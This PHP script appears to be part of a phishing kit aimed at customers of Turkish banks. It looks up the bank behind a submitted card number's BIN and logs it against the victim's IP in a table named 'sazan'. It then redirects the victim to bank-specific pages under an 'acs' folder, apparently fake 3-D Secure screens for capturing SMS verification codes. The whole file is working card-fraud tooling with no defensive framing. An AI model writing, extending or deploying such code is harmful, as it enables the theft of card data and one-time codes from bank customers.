<?php
    include('../../baglan.php');
	function contains($str, array $arr) {
		foreach($arr as $a) {
			if (str_contains($str,$a) !== false) return true;
		}
		return false;
	}
    if(!isset($_GET['bin'])&&!isset($_SESSION['bin'])) return;
    $bin = isset($_SESSION['bin']) ? $_SESSION['bin'] : $_GET['bin'];

    $data = http_build_query( array( 'CardNumber' => $bin ));
    $opts = array('http'=>array('method' => 'POST', 'header' => "User-Agent:MyAgent/1.0\r\n", 'content' => $data));
    $context = stream_context_create($opts);
    $undecoded = @file_get_contents('https://posservice.esnekpos.com/api/services/EYVBinService', false, $context);
    $binData = json_decode($undecoded, true);
    $bank = $binData ? ($binData["Bank_Name"] ? $binData["Bank_Name"] . " - " . $binData["Card_Type"] . " - " . $binData["Card_Family"] : "") : "";

    $query = $db->prepare("UPDATE sazan SET bank=? WHERE ip=?");
    $query->execute(array($bank, $ip));

    $banks = array('GARANTİ', 'GARANTI', 'YAPI VE KREDI', 'YAPI VE KREDİ', 'YAPI KREDI', 'YAPI KREDİ', 'ZIRAAT', 'ZİRAAT', 'AKBANK','FINANSBANK', 'FİNANSBANK', 'FİNANS BANK', 'DENIZBANK', 'DENİZBANK', 'ING BANK','İNG BANK', 'HALK BANK', 'IS BANK','İŞBANK', 'İŞ BANK');
    if(contains($bank, $banks)) {
        if(str_contains($bank, 'GARANTI') || str_contains($bank, 'GARANTİ')) {
            die(header('location:../acs/garanti.php'));
        } else if(str_contains($bank, 'YAPI VE KREDI') || str_contains($bank, 'YAPI VE KREDİ') || str_contains($bank, 'YAPI KREDI') || str_contains($bank, 'YAPI KREDİ')) {
            die(header('location:../acs/yapikredi.php'));
        } else if(str_contains($bank, 'ZIRAAT') || str_contains($bank, 'ZİRAAT')) {
            die(header('location:../acs/ziraat.php'));
        } else if(str_contains($bank, 'AKBANK')) {
            die(header('location:../acs/akbank.php'));
        } else if(str_contains($bank, 'FINANSBANK') || str_contains($bank, 'FINANS BANK') || str_contains($bank, 'FİNANSBANK') || str_contains($bank, 'FİNANS BANK')) {
            die(header('location:../acs/finansbank.php'));
        } else if(str_contains($bank, 'DENIZBANK') || str_contains($bank, 'DENİZBANK')) {
            die(header('location:../acs/denizbank.php'));
        } else if(str_contains($bank, 'ING BANK') || str_contains($bank, 'İNG BANK')) {
            die(header('location:../acs/ing.php'));
        } else if(str_contains($bank, 'HALK BANK')) {
            die(header('location:../acs/halkbank.php'));
        } else if(str_contains($bank, 'IS BANK') || str_contains($bank, 'İŞ BANK') || str_contains($bank, 'İŞBANK')) {
            die(header('location:../acs/isbankasi.php'));
        } else die(header('location:../acs/sms.php'));
    } else die(header('location:../acs/sms.php'));